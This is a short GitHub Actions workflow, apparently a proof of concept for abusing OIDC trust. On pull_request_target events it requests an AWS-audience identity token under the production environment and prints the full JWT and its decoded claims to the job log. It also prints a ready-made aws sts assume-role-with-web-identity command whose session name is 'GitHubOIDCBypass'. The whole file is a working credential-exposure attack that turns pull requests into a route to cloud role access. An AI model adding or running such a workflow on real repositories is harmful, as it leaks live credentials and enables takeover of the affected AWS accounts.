name: OIDC PR Target Full Token
on:
  pull_request_target:
    types: [opened, synchronize, reopened]
permissions:
  id-token: write
  contents: read
jobs:
  oidc-full-token:
    runs-on: ubuntu-latest
    environment: production
    steps:
      - name: Get OIDC Full JWT and decoded sub claim
        run: |
          FULL_JWT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r .value)
          echo "=== FULL JWT (for STS assume-role) ==="
          echo "$FULL_JWT"
          echo ""
          echo "=== DECODED PAYLOAD ==="
          PAYLOAD=$(echo "$FULL_JWT" | cut -d. -f2)
          echo "$PAYLOAD" | python3 -c "import sys,base64,json; d=sys.stdin.read().strip(); p=d+'='*(4-len(d)%4); print(json.dumps(json.loads(base64.urlsafe_b64decode(p)),indent=2))"
          echo ""
          echo "=== STS ASSUME-ROLE COMMAND ==="
          echo "aws sts assume-role-with-web-identity \\"
          echo "  --role-arn arn:aws:iam::ACCOUNT_ID:role/ROLE_NAME \\"
          echo "  --role-session-name GitHubOIDCBypass \\"
          echo "  --web-identity-token \"$FULL_JWT\""
